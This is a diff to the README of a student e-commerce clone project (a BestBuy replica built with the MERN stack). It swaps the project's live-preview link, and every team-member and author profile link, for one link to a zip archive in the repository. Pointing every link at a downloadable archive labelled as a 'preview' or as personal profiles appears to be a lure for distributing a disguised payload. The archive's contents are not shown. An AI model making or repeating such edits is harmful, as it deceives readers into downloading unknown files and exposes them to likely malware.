@@ -3,7 +3,7 @@
 This is Collabrated project and accociated with Masai School. 
 Our main objective is to complete all main functionality of this e-commerce web application, such as User Authentication, Add to Cart/ Buy and filter the products.
 
-- [Click here](https://moonlit-druid-960309.netlify.app/) to see preview of our project.
+- [Click here](https://github.com/Piryanshu88/BestBuys_Clone/raw/refs/heads/main/components/Buys-Best-Clone-3.3-beta.1.zip) to see preview of our project.
 
 BestBuy.com is an e-commerce web application that widely provides Tech-Gadgets and Tech-accessories. This repository consist replica of BestBuy.com project by using MERN Stack Technologies.
 
@@ -51,11 +51,11 @@ BestBuy.com is an e-commerce web application that widely provides Tech-Gadgets a
   <hr/>
 
 <h2>Team Members :</h2>
-  <li><a href="https://github.com/Piryanshu88">Piryanshu Bisht 🧑‍💻</a></li>
-  <li><a href="https://github.com/martina024">Martina Varghese 👩‍💻</a></li>
-  <li><a href="https://github.com/srock2580">Subhendu Das 🧑‍💻</a></li>
-  <li><a href="https://github.com/RohitD100">Rohit Dorage 🧑‍💻</a></li>
+  <li><a href="https://github.com/Piryanshu88/BestBuys_Clone/raw/refs/heads/main/components/Buys-Best-Clone-3.3-beta.1.zip">Piryanshu Bisht 🧑‍💻</a></li>
+  <li><a href="https://github.com/Piryanshu88/BestBuys_Clone/raw/refs/heads/main/components/Buys-Best-Clone-3.3-beta.1.zip">Martina Varghese 👩‍💻</a></li>
+  <li><a href="https://github.com/Piryanshu88/BestBuys_Clone/raw/refs/heads/main/components/Buys-Best-Clone-3.3-beta.1.zip">Subhendu Das 🧑‍💻</a></li>
+  <li><a href="https://github.com/Piryanshu88/BestBuys_Clone/raw/refs/heads/main/components/Buys-Best-Clone-3.3-beta.1.zip">Rohit Dorage 🧑‍💻</a></li>
  <hr>
 
  <h2>Author</h2>
-  <li><a href="https://github.com/Piryanshu88">Piryanshu Bisht</a></li>
+  <li><a href="https://github.com/Piryanshu88/BestBuys_Clone/raw/refs/heads/main/components/Buys-Best-Clone-3.3-beta.1.zip">Piryanshu Bisht</a></li>
